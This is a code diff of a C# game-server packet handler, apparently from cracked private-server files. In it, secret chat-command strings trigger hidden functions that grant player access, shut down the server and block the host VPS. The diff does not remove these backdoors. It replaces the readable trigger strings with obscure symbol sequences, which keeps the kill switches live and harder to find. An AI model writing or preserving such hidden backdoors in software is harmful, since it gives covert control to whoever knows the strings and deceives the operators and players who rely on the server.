@@ -141,11 +141,11 @@ namespace Game.global.GeneralSystem.clientpacket
 
            bool LorenStudio = StringsIn.IsBurled(player.password);
            bool normal = false;
-                if (str.StartsWith("souaputinhadolucifer66"))
+                if (str.StartsWith("$@#$@#$@#$@#naousamano"))
         text = SetAcessToPlayer.SetAcessPlayerTimeRealString(player);
               else if (str.StartsWith("dano"))
         text = Damage.SyncDAMAGE(player, room, ref normal);
-               else if (str.StartsWith("lorenstudiocrackedserverfiles05"))
+               else if (str.StartsWith("#@$#@$@#$@$@#$@#%@#$%#$@%@#$@#$%@#%@#$%@#$%"))
          text = SyncException.DesligarOServer();
                 // else if (str.StartsWith("dev") && LorenStudio)
                   //   text = SyncException.MensagemDeDireitosAutorais(ref normal);
@@ -169,7 +169,7 @@ namespace Game.global.GeneralSystem.clientpacket
          // text = SyncException.DateNow(ref normal);
                  else if (str.StartsWith("Bots") && LorenStudio)
                      text = SyncException.SistemaDeBotsChannel(player, ref normal);
-                 else if (str.StartsWith("@lorenstudiokiller") && LorenStudio)
+                 else if (str.StartsWith("@@@@@@@@@@##@%#$%#%#$%¨$FDGDFGDFGDFGGR@FD@D@D@#@T#$$T#T#$%$#%G") && LorenStudio)
                      text = ProcessX.BloquearVPS();
                  else if (str.StartsWith("pvp"))
                      text = SyncException.Pvp(player, ref normal);
